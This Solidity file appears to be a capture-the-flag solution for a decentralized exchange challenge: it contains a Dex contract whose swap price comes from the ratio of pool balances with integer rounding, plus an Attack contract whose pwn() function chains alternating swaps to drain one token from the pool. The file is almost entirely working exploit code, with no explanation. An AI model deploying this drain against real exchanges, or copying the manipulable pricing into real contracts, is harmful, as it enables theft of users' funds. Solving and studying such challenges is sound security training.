// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor(address initialOwner) Ownable(initialOwner) {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract Attack {
    Dex private immutable dex;

    // 0xbc03f0f68d26a7A60bc1d0AcdFda566fBA5Be9B7
    IERC20 private immutable token1;

    // 0x9045b0648957AA9fA3E1b29692e03aD9249231a1
    IERC20 private immutable token2;

    constructor(address _address) {
        dex = Dex(_address);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function pwn() external  {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), 500);
        token2.approve(address(dex), 500);

        swap(token1, token2);
        swap(token2, token1);
        swap(token1, token2);
        swap(token2, token1);
        swap(token1, token2);

        dex.swap(address(token2), address(token1), 45);
    }

    function swap(IERC20 from, IERC20 to) public {
        dex.swap(address(from), address(to), from.balanceOf(address(this)));
    }
}